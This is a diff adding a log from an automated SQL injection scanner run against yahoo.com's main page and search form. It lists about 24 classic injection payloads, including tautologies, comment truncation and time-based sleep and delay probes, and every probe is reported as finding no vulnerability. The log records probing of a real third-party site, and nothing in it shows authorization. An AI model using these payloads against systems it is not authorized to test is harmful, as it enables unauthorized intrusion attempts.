@@ -1,0 +1,98 @@
+2025-03-09 14:03:44,692 - INFO - Starting scan for URL: https://yahoo.com
+2025-03-09 14:03:46,752 - INFO - Detected 2 forms on https://yahoo.com.
+2025-03-09 14:03:46,752 - INFO - Testing GET form at https://search.yahoo.com/search with payload '
+2025-03-09 14:03:47,592 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:47,592 - INFO - Testing GET form at https://search.yahoo.com/search with payload "
+2025-03-09 14:03:48,824 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:48,824 - INFO - Testing GET form at https://search.yahoo.com/search with payload OR '1'='1' -- -
+2025-03-09 14:03:49,647 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:49,648 - INFO - Testing GET form at https://search.yahoo.com/search with payload OR "1"="1" -- -
+2025-03-09 14:03:50,327 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:50,328 - INFO - Testing GET form at https://search.yahoo.com/search with payload ' OR '1'='1' #
+2025-03-09 14:03:51,091 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:51,092 - INFO - Testing GET form at https://search.yahoo.com/search with payload " OR "1"="1" #
+2025-03-09 14:03:51,729 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:51,729 - INFO - Testing GET form at https://search.yahoo.com/search with payload ') OR ('1'='1
+2025-03-09 14:03:52,586 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:52,587 - INFO - Testing GET form at https://search.yahoo.com/search with payload ") OR ("1"="1
+2025-03-09 14:03:53,237 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:53,238 - INFO - Testing GET form at https://search.yahoo.com/search with payload admin' -- -
+2025-03-09 14:03:54,223 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:54,223 - INFO - Testing GET form at https://search.yahoo.com/search with payload admin" -- -
+2025-03-09 14:03:55,096 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:55,096 - INFO - Testing GET form at https://search.yahoo.com/search with payload '; waitfor delay '0:0:5'--
+2025-03-09 14:03:55,709 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:55,709 - INFO - Testing GET form at https://search.yahoo.com/search with payload "; waitfor delay "0:0:5"--
+2025-03-09 14:03:56,396 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:56,396 - INFO - Testing GET form at https://search.yahoo.com/search with payload ' OR SLEEP(5) -- -
+2025-03-09 14:03:57,500 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:57,501 - INFO - Testing GET form at https://search.yahoo.com/search with payload " OR SLEEP(5) -- -
+2025-03-09 14:03:58,127 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:58,128 - INFO - Testing GET form at https://search.yahoo.com/search with payload 1' or '1'='1
+2025-03-09 14:03:58,809 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:58,809 - INFO - Testing GET form at https://search.yahoo.com/search with payload 1" or "1"="1
+2025-03-09 14:03:59,392 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:03:59,392 - INFO - Testing GET form at https://search.yahoo.com/search with payload ';select pg_sleep(5);--
+2025-03-09 14:04:00,099 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:00,099 - INFO - Testing GET form at https://search.yahoo.com/search with payload ";select pg_sleep(5);--
+2025-03-09 14:04:01,015 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:01,015 - INFO - Testing GET form at https://search.yahoo.com/search with payload 1' or 1=1--
+2025-03-09 14:04:01,678 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:01,678 - INFO - Testing GET form at https://search.yahoo.com/search with payload 1" or 1=1--
+2025-03-09 14:04:02,541 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:02,541 - INFO - Testing GET form at https://search.yahoo.com/search with payload 1' or '1'='1'/*
+2025-03-09 14:04:03,217 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:03,218 - INFO - Testing GET form at https://search.yahoo.com/search with payload 1" or "1"="1"/*
+2025-03-09 14:04:03,902 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:03,902 - INFO - Testing GET form at https://search.yahoo.com/search with payload 1' or '1'='1';--
+2025-03-09 14:04:04,542 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:04,543 - INFO - Testing GET form at https://search.yahoo.com/search with payload 1" or "1"="1";--
+2025-03-09 14:04:05,809 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:05,811 - INFO - Testing GET form at https://yahoo.com with payload '
+2025-03-09 14:04:07,785 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:07,785 - INFO - Testing GET form at https://yahoo.com with payload "
+2025-03-09 14:04:09,233 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:09,233 - INFO - Testing GET form at https://yahoo.com with payload OR '1'='1' -- -
+2025-03-09 14:04:10,323 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:10,324 - INFO - Testing GET form at https://yahoo.com with payload OR "1"="1" -- -
+2025-03-09 14:04:12,342 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:12,342 - INFO - Testing GET form at https://yahoo.com with payload ' OR '1'='1' #
+2025-03-09 14:04:13,548 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:13,549 - INFO - Testing GET form at https://yahoo.com with payload " OR "1"="1" #
+2025-03-09 14:04:14,845 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:14,846 - INFO - Testing GET form at https://yahoo.com with payload ') OR ('1'='1
+2025-03-09 14:04:16,006 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:16,007 - INFO - Testing GET form at https://yahoo.com with payload ") OR ("1"="1
+2025-03-09 14:04:17,422 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:17,422 - INFO - Testing GET form at https://yahoo.com with payload admin' -- -
+2025-03-09 14:04:18,752 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:18,753 - INFO - Testing GET form at https://yahoo.com with payload admin" -- -
+2025-03-09 14:04:19,722 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:19,723 - INFO - Testing GET form at https://yahoo.com with payload '; waitfor delay '0:0:5'--
+2025-03-09 14:04:21,417 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:21,417 - INFO - Testing GET form at https://yahoo.com with payload "; waitfor delay "0:0:5"--
+2025-03-09 14:04:22,475 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:22,475 - INFO - Testing GET form at https://yahoo.com with payload ' OR SLEEP(5) -- -
+2025-03-09 14:04:23,736 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:23,736 - INFO - Testing GET form at https://yahoo.com with payload " OR SLEEP(5) -- -
+2025-03-09 14:04:25,425 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:25,425 - INFO - Testing GET form at https://yahoo.com with payload 1' or '1'='1
+2025-03-09 14:04:26,537 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:26,539 - INFO - Testing GET form at https://yahoo.com with payload 1" or "1"="1
+2025-03-09 14:04:28,195 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:28,196 - INFO - Testing GET form at https://yahoo.com with payload ';select pg_sleep(5);--
+2025-03-09 14:04:29,962 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:29,962 - INFO - Testing GET form at https://yahoo.com with payload ";select pg_sleep(5);--
+2025-03-09 14:04:31,397 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:31,397 - INFO - Testing GET form at https://yahoo.com with payload 1' or 1=1--
+2025-03-09 14:04:32,605 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:32,605 - INFO - Testing GET form at https://yahoo.com with payload 1" or 1=1--
+2025-03-09 14:04:33,604 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:33,605 - INFO - Testing GET form at https://yahoo.com with payload 1' or '1'='1'/*
+2025-03-09 14:04:34,682 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:34,682 - INFO - Testing GET form at https://yahoo.com with payload 1" or "1"="1"/*
+2025-03-09 14:04:35,742 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:35,743 - INFO - Testing GET form at https://yahoo.com with payload 1' or '1'='1';--
+2025-03-09 14:04:37,099 - INFO - No SQL Injection vulnerability detected.
+2025-03-09 14:04:37,099 - INFO - Testing GET form at https://yahoo.com with payload 1" or "1"="1";--
+2025-03-09 14:04:38,141 - INFO - No SQL Injection vulnerability detected.
